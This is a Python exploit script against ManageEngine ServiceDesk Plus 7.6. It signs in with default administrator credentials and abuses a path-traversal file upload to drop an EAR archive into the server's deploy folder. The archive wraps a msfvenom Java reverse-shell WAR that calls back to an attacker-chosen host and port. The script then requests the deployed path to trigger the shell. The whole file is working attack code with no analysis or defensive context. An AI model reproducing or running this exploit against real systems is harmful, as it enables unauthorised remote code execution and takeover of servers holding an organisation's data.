import os, random, requests, string, subprocess, zipfile
from getpass import *
from requests.packages.urllib3.fields import RequestField
from requests.packages.urllib3.filepost import encode_multipart_formdata
from time import sleep

# ManageEngine ServiceDesk Plus 7.6 Exploit
r_string = lambda n: ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(n))

def main():
	print("ManageEngine ServiceDesk Plus 7.6 Exploit")
	sess = requests.Session()
	target = raw_input("Target URI: ")
	sess.get(target)
	#~ username = getuser()
	#~ password = getpass("Password: ")
	#~ data = {'j_username':username,
			#~ 'j_password':password,
			#~ 'logonDomainName':-1}
	data = {'j_username':'administrator',
			'j_password':'administrator',
			'logonDomainName':-1}
	login = sess.post('{}{}'.format(target,'j_security_check'), data=data)
	
	print("Sending bogus file")
	bogus = send_multipart(target, sess)
	
	if bogus.ok:
		filename = r"{}{}".format(r_string(8),".war")
		if create_payload(filename) == 0:
			if not os.path.exists(r'META-INF'):
				os.makedirs(r'META-INF')
			with open(r'META-INF/application.xml', 'wb') as app_xml:
				ear_app = r_string(32)
				app_xml.write("<?xml version=\"1.0\" encoding=\"UTF-8\"?>")
				app_xml.write("<application>")
				app_xml.write("<display-name>" + r_string(32) + "</display-name>")
				app_xml.write("<module><web><web-uri>" + filename + "</web-uri>")
				app_xml.write("<context-root>/" + ear_app + "</context-root></web></module></application>")
			app_xml.close()
			ear_file_name = r"{}{}".format(r_string(8),".ear")
			with zipfile.ZipFile(ear_file_name, mode = 'w') as ear_file:
				print("Creating .ear file")
				ear_file.write(r'META-INF/application.xml')
				ear_file.write(filename)
			ear_file.close()
			exploit = send_multipart(target, sess, ear_file_name)
			if exploit.ok:
				print("Upload appears to have been successful")
				print("Attempting to launch payload in deployed WAR...")
				for i in range(1, 10):
					sleep(2)
					trigger = sess.get('{}{}/{}/{}'.format(target, ear_app, filename, r_string(16)))
					if trigger.ok:
						print("Trigger successful")
						break
			else:
				print("EAR upload failed")
		else:
			print("Bogus file upload failed")

def create_payload(filename):
	print("Creating msfvenom payload [java/shell_reverse_tcp, format: war]")
	lhost = raw_input("LHOST=")
	lport = raw_input("LPORT=")
	return subprocess.call(["msfvenom", "-p", "java/shell_reverse_tcp", "LHOST={}".format(lhost), "LPORT={}".format(lport), "-f", "war", "-b", r"\x00\x0a", "-o", filename])

def send_multipart(target, sess, path=None):
	rand1 = r_string(4)
	if path:
		f = {'module':(None, '../../server/default/deploy', None),
		'{}'.format(rand1): (path, open(path, 'rb'), 'application/octet-stream'),
		'att_desc':(None, '', None)}
	else:
		f = {'module':(None, r_string(4), None),
		'{}'.format(rand1): (r_string(30), r_string(6), 'application/octet-stream'),
		'att_desc':(None, '', None)}
	r = requests.Request('POST', target, files=f)	
	prep = r.prepare()
	return sess.send(prep)
	
if __name__ == "__main__":
	exit(main())
